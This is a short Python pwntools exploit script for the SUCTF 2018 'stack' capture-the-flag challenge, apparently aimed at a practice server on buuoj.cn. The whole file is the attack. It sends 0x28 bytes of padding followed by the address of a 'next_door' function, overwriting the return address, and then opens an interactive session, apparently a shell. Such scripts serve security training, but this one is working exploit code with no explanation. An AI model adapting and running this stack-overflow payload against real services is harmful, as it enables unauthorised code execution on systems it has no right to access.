from pwn import *

pn = 'SUCTF_2018_stack'

#p = process(pn)
p = remote('node4.buuoj.cn', 26883)
elf = ELF(pn)

payload = b'a' * 0x28 + p64(elf.sym['next_door'] + 1)

p.sendafter(b'==\n', payload)

p.interactive()